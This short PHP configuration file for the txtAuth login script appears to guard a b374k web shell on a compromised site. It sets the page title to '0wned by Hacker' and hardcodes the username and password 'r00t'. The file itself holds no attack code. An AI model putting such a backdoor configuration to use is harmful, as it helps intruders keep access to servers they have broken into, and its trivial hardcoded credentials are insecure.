<?php
$tacfgd['uname'] = 'r00t';
$tacfgd['pword'] = 'r00t';


// Title of page.
$tacfgd['title'] = '0wned by Hacker';

// Text to appear just above login form.
$tacfgd['helptext'] = 'B374k Beta';


// Set to true to enable the optional remember-me feature, which stores encrypted login details to 
// allow users to be logged-in automatically on their return. Turn off for a little extra security.
$tacfgd['allowrm'] = true;

// If you have multiple protected pages, and there's more than one username / password combination, 
// you need to group each combination under a distinct rmgroup so that the remember-me feature 
// knows which login details to use.
$tacfgd['rmgroup'] = 'default';

// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. 
// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not 
// destroy the session, so that is left up to you.
$tacfgd['ownsessions'] = false;


?>